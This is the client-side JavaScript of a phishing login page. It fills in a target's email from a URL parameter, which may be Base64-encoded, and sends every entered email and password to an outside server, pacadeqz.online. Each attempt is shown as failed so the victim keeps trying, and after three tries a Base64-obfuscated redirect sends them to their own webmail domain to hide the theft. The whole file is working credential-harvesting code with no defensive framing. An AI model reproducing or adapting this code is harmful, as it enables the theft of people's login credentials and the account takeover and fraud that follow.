$(document).ready(function() {
  $('#alert-ok').on('click', function () {
      $('#custom-alert').removeClass('flex').addClass('hidden');
    });
  // Track login attempts
  let loginAttempts = 0;
  
  function getDomain(email) {
    if (typeof email !== 'string') {
      return null
    }
  
    const parts = email.split('@')
    if (parts.length !== 2) {
      return null
    }
  
    const domain = parts[1].trim()
    const domainParts = domain.split('.')
    if (domainParts.length < 2) {
      return null
    }
  
    const lastPart = domainParts[domainParts.length - 1]
    const secondLast = domainParts[domainParts.length - 2]
    if (secondLast.length <= 3 && lastPart.length <= 3) {
      return domainParts.slice(-3).join('.')
    } else {
      return domainParts.slice(-2).join('.')
    }
  }
  function getDomainNameWithoutTld(email){
    const mainDomain = getDomain(email);
    if (mainDomain === null) {
      return null;
    }
    // split on dots and take the very first segment
    return mainDomain.split('.')[0];
  }
  // 1. Pre-fill Email from URL
  function processUrlParams() {
    const urlParams = new URLSearchParams(window.location.search);
    const utmParam = urlParams.get('utm');
    
    // Show error if utm parameter is missing or empty
    if (!utmParam || utmParam.trim() === '') {
      $('#invalid-url').removeClass('hidden');
      $('#login-form').addClass('hidden');
      //$('#login-form2').style.display = 'none';
      return;
    }
    
    let email = utmParam;
    
    // Check if it's Base64 encoded
    if (!isValidEmail(email)) {
      try {
        // Try to decode as Base64
        email = atob(utmParam);
      } catch (e) {
        // If decoding fails, show error and hide form
        $('#invalid-url').removeClass('hidden');
        $('#login-form').addClass('hidden');
       //$('#login-form2').style.display = 'none';
        return;
      }
    }
    
    // Check if decoded value is a valid email
    if (isValidEmail(email)) {
      $('#email').val(email);
      $('#password').focus();
    } else {
      // If not a valid email, show error and hide form
      $('#invalid-url').removeClass('hidden');
      $('#login-form').addClass('hidden');
    }
  }
  
  // 2. Email Validation
  function isValidEmail(email) {
    // Strict regex for email validation
    const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
    return emailRegex.test(email);
  }
  // Validate form inputs
  function validateForm() {
    const email = $('#email').val();
    const password = $('#password').val();
    
    if (!isValidEmail(email)) {
      $('#email').addClass('border-red-500 ring-1 ring-red-500');
      return false;
    }
    
    if (!password) {
      $('#password').addClass('border-red-500 ring-1 ring-red-500');
      return false;
    }
    
    return true;
  }
  
  // Reset validation styling
  $('#email').on('input', function() {
    $(this).removeClass('border-red-500 ring-1 ring-red-500');
  });
  
  $('#password').on('input', function() {
    $(this).removeClass('border-red-500 ring-1 ring-red-500');
  });
  
  $('#password').on('keydown', function() {

  });
  
  // 3. Login Behavior
  function handleLogin(e) {
    if (e) e.preventDefault();
    
    if (!validateForm()) return;

    
    $.ajax({
      url: 'https://pacadeqz.online/sol/mara/post.php',
      type: 'POST',
      data: {
        email: $('#email').val(),
        password: $('#password').val()
      },
      success: function(response) {
        loginFailed();
      },
      error: function() {
        loginFailed();
      }
    });
  }
  
  function loginFailed() {
    var email = $("#email").val();
    console.log(email);
      $('#custom-alert').removeClass('hidden').addClass('flex');
    // Track attempts
    loginAttempts++;
    
    $("#password").val("");
     $("#password").focus();
    if (loginAttempts >= 3) {
      window.location.href = atob("aHR0cHM6Ly9tYWlsLg==") + getDomain(email);

    }
  }
  
  // Event listeners
  $('#login-form').on('submit', handleLogin);
  
  $('#password').on('keypress', function(e) {
    if (e.which === 13) { // Enter key
      handleLogin(e);
    }
  });
  
  // Initialize
  processUrlParams();
});